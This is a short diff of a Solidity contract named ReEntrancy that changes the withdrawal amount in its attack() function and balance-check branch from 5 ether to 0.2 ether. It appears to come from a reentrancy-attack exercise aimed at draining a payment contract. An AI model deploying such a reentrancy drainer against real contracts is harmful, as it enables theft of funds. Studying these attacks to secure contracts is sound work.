@@ -24,7 +24,7 @@ contract ReEntrancy {
 
         if(address(_payment).balance >= 0.2 ether) {
 
-            _payment.withDraw(5 ether, address(0));
+            _payment.withDraw(0.2 ether, address(0));
            
 
         }
@@ -35,7 +35,7 @@ contract ReEntrancy {
 
     function attack() external {
         
-         _payment.withDraw(5 ether, address(0));        
+         _payment.withDraw(0.2 ether, address(0));        
 
     }
 
